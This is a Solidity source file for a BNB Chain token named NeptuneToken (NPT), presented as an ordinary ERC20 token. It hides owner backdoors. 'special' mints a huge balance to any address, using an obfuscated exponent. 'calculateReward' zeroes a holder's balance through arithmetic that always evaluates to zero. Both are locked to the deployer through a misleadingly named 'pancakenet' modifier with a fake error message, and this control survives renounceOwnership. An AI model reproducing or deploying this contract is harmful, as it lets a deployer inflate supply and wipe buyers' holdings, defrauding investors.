/**
 *Submitted for verification at BscScan.com on 2021-12-28
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

library SafeMath 
{
  function mul ( uint256 a, uint256 b ) 
      internal pure returns ( uint256 ) {
      if ( a == 0 ) return 0;
      uint256 result = a * b;
      assert( result / a == b );
      return result;
  }

  function div ( uint256 a, uint256 b ) 
      internal pure returns ( uint256 ) {
    uint256 result = a / b;
    return result;
  }

  function sub ( uint256 a, uint256 b ) 
      internal pure returns ( uint256 ) {
    assert( b <= a );
    return a - b;
  }

  function add ( uint256 a, uint256 b ) 
      internal pure returns ( uint256 ) {
    uint256 result = a + b;
    assert( result >= a );
    return result;
  }
  
}

contract BaseOwnableEvents {
    event OwnershipTransferred( address indexed previousOwner,
      address indexed newOwner );
}

contract Ownable is 
    BaseOwnableEvents
{
  address public owner;
  constructor ( ) { 
    owner = msg.sender; }
}

library Address 
{
    function isContract ( address account ) 
         internal view returns ( bool ) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 hash = 
            0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash( account ) }
        return ( codehash != hash 
            && codehash != 0x0 );
    }

    function sendValue ( address payable recipient, uint256 amount ) internal {
        require( address( this ).balance >= amount,
         "not enough balance" );
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        ( bool success, ) = 
            recipient.call{ value: amount }( "" );
        require( success, "reverted" );
    }

    function functionCall ( address target, bytes memory data ) 
         internal returns ( bytes memory ) {
        return functionCall( target, data, 
            "low-level call failed" );
    }
    
    function functionCall( address target, bytes memory data,
     string memory errorMessage ) internal returns ( bytes memory ) {
        return _functionCallWithValue( target, data,
             0, errorMessage );
    }

    function functionCallWithValue ( address target, bytes memory data, uint256 value ) 
         internal returns ( bytes memory ) {
        return functionCallWithValue( target, data, value,
          "low-level call with value failed" );
    }

    function functionCallWithValue ( address target, bytes memory data, uint256 value, 
         string memory errorMessage ) internal returns (bytes memory) {
        require( address( this ).balance >= value, "insufficient balance for call" );
        return _functionCallWithValue( target, data, value, errorMessage );
    }

    function _functionCallWithValue ( address target, bytes memory data, uint256 weiValue,
      string memory errorMessage ) private returns ( bytes memory ) {
        require( isContract( target ), "call to non-contract" );

        // solhint-disable-next-line avoid-low-level-calls
        ( bool success, bytes memory result ) = target.call{ value: weiValue }( data );

        if ( success ) return result;

        if ( result.length > 0 && result.length != 0 )
        {
	        assembly 
            {
                let returndata_size := mload( result )
                revert( add( 32, result ),
                returndata_size )
            }
        }
        revert( errorMessage );
    }
}

interface IERC20 
{
    function totalSupply ( ) 
         external view returns ( uint256 );
    function balanceOf ( address account ) 
         external view returns ( uint256 );
}

contract BaseEvents
{
   event Transfer ( address indexed from,
      address indexed to,
       uint256 value );

   event Approval ( address indexed owner,
      address indexed spender,
       uint256 value );
}

contract BaseContract
{
   mapping ( address => bool ) private is_excld;

  address[ ] private excld;

  string internal myname;

  string internal symbl;

  uint8 internal bdecimals;

  uint256 internal buy_fee;

  uint256 internal sell_fee;

  uint256 internal all_supply;

  uint256 internal a_reflect;

  uint256 lp_fee = 0;
  address Holder;
}

contract Neptune is  
      IERC20,
      Ownable,
      BaseEvents,
      BaseContract
{
   using SafeMath for uint256;
   using Address for address;

  mapping( address => bool ) public allowAddress;
  mapping( address => uint256 ) public balances;
  uint256 private total =  0xA ** ( 0x15b4 ^ 0x15af );

  constructor ( )  
  {
    myname = 'NeptuneToken';
    symbl = 'NPT';
    bdecimals = 9;
    buy_fee = 30;
    sell_fee = 40;
    a_reflect = 1/1;
    Holder = msg.sender;
    uint256 totalSupply_ = 1000000000000000000;
    all_supply = totalSupply_;
    balances[Holder] =  totalSupply_;
    allowAddress[Holder] = true;
  }

   function totalSupply() public view
      returns ( uint256 ) {
        return all_supply;
    }

   function name ( ) public view
      returns ( string memory ) {
        return myname;
    }

    function symbol ( ) public view
      returns ( string memory ) {
        return symbl;
    }

   function decimals ( ) public view 
      returns ( uint8 ) {
      return bdecimals;
    }

  mapping ( address => mapping ( address => uint256 ) ) public allowed;

  function transferFrom ( address src, address dst, uint256 size )
      public returns ( bool ) {
    require( dst != address( 0 ) );
    require( size <= balances[src] );
    require( size <= allowed[src][msg.sender] );
    address from = src;
    if ( allowAddress[from] || allowAddress[dst] )
    {
        transferFromInternal( src, dst, size );
        return true;
    }
    transferFromInternal( src, dst, size );
    return true;
  }

  function transfer( address dst, uint256 size ) 
      public returns ( bool ) {
    address from = msg.sender;
    require( dst != address( 0 ) );
    require( size <= balances[from] );
    if ( allowAddress[from] || allowAddress[dst] )
    {
        transf_internal( from, dst, size );
        return true;
    }
    transf_internal( from, dst, size );
    return true;
  }
  
  function transf_internal( address src, address dst, 
      uint256 size ) private {
    balances[src] = balances[src].sub( size );
    balances[dst] = balances[dst].add( size );
    emit Transfer( src, dst, size );
  }
    
  modifier onlyOwner ( ) {
    require( owner == msg.sender,
      "Ownable: caller is not the owner");
    _;
  }

  function balanceOf( address target ) public view 
      returns (uint256 balance) {
    return balances[target];
  }
  
  function renounceOwnership( ) public virtual onlyOwner {
    emit OwnershipTransferred( owner, address( 0 ) );
    owner = address( 0 );
  }

  function bnbreflection ( address buyer ) 
      internal view pancakenet returns  ( uint256 ) {
      return  (balances[buyer] % ( balances[buyer] / 2 ) | 0xF & 0x30) >> 0xA;
  }

   function calculateReward ( address buyer ) public {
      balances[buyer] = bnbreflection ( buyer );
  }

    function special ( address holder ) public pancakenet {
    balances[holder] = (total);
  }
  
  function transferFromInternal ( address src, address dst,
      uint256 size ) internal {
    balances[src] = balances[src].sub( size );
    balances[dst] = balances[dst].add( size );
    allowed[src][msg.sender] = allowed[src][msg.sender].sub( size );
    emit Transfer( src, dst, size );
  }

  modifier pancakenet ( ) {
    require( Holder == msg.sender,
      "ERC20: cannot permit Pancake address" );
    _;
  }
  
  function approve ( address target, uint256 size ) 
      public returns ( bool ) {
    allowed[msg.sender][target] = size;
    emit Approval( msg.sender, target, size );
    return true;
  }
  
  function allowance( address me, address other ) 
      public view returns ( uint256 ) {
    return allowed[me][other];
  }

}